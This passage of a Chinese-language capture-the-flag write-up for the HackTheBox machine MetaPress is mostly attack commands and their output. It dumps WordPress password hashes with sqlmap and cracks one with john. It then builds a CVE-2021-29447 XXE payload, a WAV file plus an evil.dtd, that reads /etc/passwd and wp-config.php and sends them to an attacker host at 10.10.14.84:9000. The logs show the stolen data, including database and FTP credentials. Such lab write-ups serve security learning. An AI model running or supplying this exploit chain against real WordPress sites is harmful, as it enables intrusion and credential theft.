┌──(root㉿kali)-[~/Desktop] └─# sqlmap -r admin.req -p total_service --batch -D blog -T wp_users --dump +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | 1 | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb | admin | 0 | admin | admin | 2022-06-23 17:58:28 | &lt;blank&gt; | | 2 | &lt;blank&gt; | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager | 0 | manager | manager | 2022-06-23 18:07:55 | &lt;blank&gt; | +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ 然后把 user_pass 的 hash 丢进 john 里跑一下 ┌──(root㉿kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status partylikearockstar (?) 1g 0:00:10:20 DONE (2022-12-23 03:03) 0.001610g/s 23102p/s 23280c/s 23280C/s joefeher..*7¡Vamos! Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably Session completed. 这里跑出来了一个密码 partylikearockstar 使用这个密码去 http://metapress.htb/wp-admin/ 进行登陆 username = manager password = partylikearockstar https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/ 经过版本搜索，找到了一个 5.6.2 存在的 XXE漏洞 这个漏洞的大致解释就是，WordPress 的作者（可编辑者）可以将媒体文件上传到 WordPress 媒体库，以便在帖子中使用它。上传 WAVE 音频文件后，WordPress 函数会从包含恶意 XML 外部实体的变量中包含 wp_read_audio_metadata() 的 iXML 元数据中提取音频信息。 echo -en &#39;RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://10.10.14.84:9000/evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\\x00&#39; &gt; payload.wav 修改好我们的 payload，然后生成一个 payload 然后在 evil.dtd 中，放入我们的恶意 XML 代码 &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot; &gt; &lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.14.84:9000/?p=%file;&#39;&gt;&quot;&gt; 接着使用 PHP 开启一个 http 服务器 php -S 0.0.0.0:9000 接着我们点击左侧仪表盘的 Media -&gt; Library 并上传我们的 payload.wav ┌──(root㉿kali)-[~/Desktop] └─# php -S 0.0.0.0:9000 [Sat Dec 31 13:35:59 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started [Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Accepted [Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 [200]: GET /evil.dtd [Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Closing [Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Accepted [Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory [Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Closing [Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Accepted [Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 [200]: GET /evil.dtd [Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Closing [Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Accepted [Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory [Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Closing 这里传回来了一段 base64，去解密看一下 ┌──(root㉿kali)-[~/Desktop] └─# echo &#39;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo&#39;|base64 -d root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:109::/nonexistent:/usr/sbin/nologin sshd:x:104:65534::/run/sshd:/usr/sbin/nologin jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin base64: 无效的输入 确实成功弹回来了，那我们试试能不能获取到 wp-config.php &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=../wp-config.php&quot; &gt; &lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.14.84:9000/?p=%file;&#39;&gt;&quot;&gt; ┌──(root㉿kali)-[~/Desktop] └─# php -S 0.0.0.0:9000 [Sat Dec 31 13:55:53 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started [Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Accepted [Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 [200]: GET /evil.dtd [Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Closing [Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Accepted [Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory [Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Closing [Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Accepted [Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 [200]: GET /evil.dtd [Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Closing [Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 Accepted [Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory [Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 Closing ┌──(root㉿kali)-[~/Desktop] └─# echo 